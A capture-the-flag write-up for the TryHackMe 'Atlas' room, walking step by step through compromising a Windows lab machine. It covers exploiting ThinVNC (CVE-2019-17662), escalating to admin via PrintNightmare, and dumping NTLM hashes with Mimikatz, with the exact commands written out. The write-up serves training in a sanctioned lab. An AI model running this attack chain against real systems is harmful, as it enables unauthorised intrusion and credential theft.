# Atlas
This is my writeup for the TryHackMe room [Atlas](https://tryhackme.com/room/atlas) created by [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle).

![image](https://user-images.githubusercontent.com/86648102/135411347-8f13e0b8-c5c2-4758-ba25-e839550dc248.png)

<details><summary> Task 1 Introduction Room Overview and Deploy! </summary>
 <br>

 This is an introductory level room which aims to teach you the very basics of Windows system exploitation, from initial access, through to privilege escalation.

**Answer the questions below**

### Press the Green "Start Machine" button to deploy the machine!
 
 > No answer needed.
<br>
 
 </details>

<details><summary> Task 2 Enumeration: Port Scanning </summary>

**Enumeration** is probably the most important thing when comes to solving any challenge.

**Answer the questions below**

### Scan your target IP (10.10.200.252) with Nmap!

Let's add a bit of flavour here, to have a more complex scan with output to a text file for later review:

`sudo nmap -sC -sV -v -oN Atlasnmapscan.txt $ip -p- -Pn`

### With the Nmap default port range, you should find that two ports are open. What port numbers are these?

Reffer to the above **scan** ; the 2 ports are appearing quickly with the verbose output.

### What service does Nmap think is running on the higher of the two ports?

The answer is found in the bottom of the nmap scan.

![image](https://user-images.githubusercontent.com/86648102/135414498-baf3e3fd-48f5-4cfd-b10f-db34df0682c7.png)

### We would usually go on to do a lot more in-depth scanning, but we will leave it at that for this introductory room. We have what we need for the time being.

> Here, it's a reference for the nmap scan switches mentioned above. 
<br>
  </details>
  

<details><summary> Task 3 Enumeration: Service Enumeration </summary>

Doing the scan as suggested above, will contain this part.
- First service : 3389 RDP: Remote Desktop Protocol, used to get remote graphic desktop session ;
- Second service: 8080 HTTP-PROXY; 
 By accessing it into a web browser, we get prompted to authenticate 
  
  ![image](https://user-images.githubusercontent.com/86648102/135415966-53b1a5c3-f48d-4460-9347-050d2b1c753a.png)

We're going to curl the target to get more info:

`curl $ip:8080 -v`
![image](https://user-images.githubusercontent.com/86648102/135416755-45b5f730-f9c5-4d52-bcb0-f72fd5848e07.png)

**Answer the questions below**

### Use searchsploit to find the vulnerability in ThinVNC

`searchsploit ThinVNC`

![image](https://user-images.githubusercontent.com/86648102/135416567-0b2b2e07-a0ba-4c51-a8c0-a9a48f692f5c.png)

<br>
</details>

<details><summary> Task 4 Attack Foothold </summary>

**Answer the questions below**

# Clone the Git repository at https://github.com/MuirlandOracle/CVE-2019-17662  to your attacking machine.

`git clone https://github.com/MuirlandOracle/CVE-2019-17662`

# Switch into the newly created exploit directory and set the file to be executable 

- First check with `ll`; if the file is executable already, go to next task.

![image](https://user-images.githubusercontent.com/86648102/135418603-22ec11b3-6820-4043-9ffc-767d3ab495e5.png)

# Read through the exploit help menu

`./CVE-2019-17662.py --help`

- This script requires two arguments

![image](https://user-images.githubusercontent.com/86648102/135418690-71194ca4-80ad-465e-9837-7d867f2f9c3f.png)

![image](https://user-images.githubusercontent.com/86648102/135418912-c2ae1f7f-6f8e-4c1d-9452-b724fd50e37d.png)

# Use the credentials found by the script to get past the HTTP Basic Auth presented when trying to access the vulnerable service in your web browser. You should have access to a user desktop!

We could use the inbrowser version or we could use Remmina for this task.

- `sudo apt install remmina`
- After you have it installed, open `remmina`
- Click on "Add new connection" where you put the newfound details

- RIght CLick > Connect 

![image](https://user-images.githubusercontent.com/86648102/135423850-0946b3ae-e6bb-42ed-add1-b3c41bd35e02.png)

<br>
</details>

<details><summary> Task 5 Access VNC <> RDP  </summary>

If the above step worked for you, then you should be already conencted to the machine via Remmina.

However, the mentioned method here is working too.

`xfreerdp /v:10.10.200.252 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:/tmp,share`

> Replace USERNAME and PASSWORD arguments with your findings
<br>
</details>

<details><summary> Task 6 Attack Privilege Escalation  </summary>

--- 

**Answer the questions below**

We will use PrintNightmare to elevate our privileges on this target.

### There are many different implementations of PrintNightmare available. You are advised to use a PowerShell version written by Caleb Stewart and John Hammond.

### Navigate to the /tmp directory of your attacking VM, then clone the repository.

`cd /tmp`
`git clone https://github.com/calebstewart/CVE-2021-1675`

- Now, on the RDP session, open a powershell and run the following command:

`. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1` 

> This allows us to view (and thus import) files that are stored in the /tmp folder of our own attacking machine!

![image](https://user-images.githubusercontent.com/86648102/135426765-0c782b7e-5390-4151-88a4-08c738764e35.png)

- Next, in powershell, run `Invoke-Nightmare`

![image](https://user-images.githubusercontent.com/86648102/135427022-bdba10ff-1795-4dd3-95e7-e5069d3736bb.png)

We can now make use of our brand new admin account!
Run:

`Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n`

Input as  Password :`P@ssw0rd` (generated before with the script)

Run `whoami /groups`

![image](https://user-images.githubusercontent.com/86648102/135427571-8b68d13f-14b7-4367-9aa3-007fc66231b2.png)

Good. We now have admin on this machine.
<br>
</details>

<details><summary> Task 7 Attack Post Exploitation  </summary>

---
**Answer the questions below**

- First up, let's get an up-to-date copy of Mimikatz to our attacking machine.
Go to https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210810-2 and download `mimikatz_trunk.zip`
Make sure that the zip file is in your /tmp directory, then unzip it with unzip mimikatz_trunk.zip.

On RPD:

`\\tsclient\share\x64\mimikatz.exe`

Then, with mimikatz open:

`privilege::debug`

> this obtains debug privileges which allows us to access other processes for "debugging" purposes.

`token::elevate`

> takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges

![image](https://user-images.githubusercontent.com/86648102/135429820-ea30492a-d8c0-4b6b-97f5-996b41d9371a.png)

# What is the Administrator account's NTLM password hash?

Found in the output of :

`lsadump::sam`

> this will provide us with a list of password hashes for every account on the machine

![image](https://user-images.githubusercontent.com/86648102/135430241-41c128b6-e617-4187-9dac-350418c37c0c.png)
<br>
</details>

<details><summary> Task 8 Conclusion Final Thoughts  </summary>

---

Congratulations: you hacked Atlas!

**We covered initial exploitation of outdated software, as well as exploiting the Windows PrintSpooler and dumping password hashes with Mimikatz.**
<br>
</details>

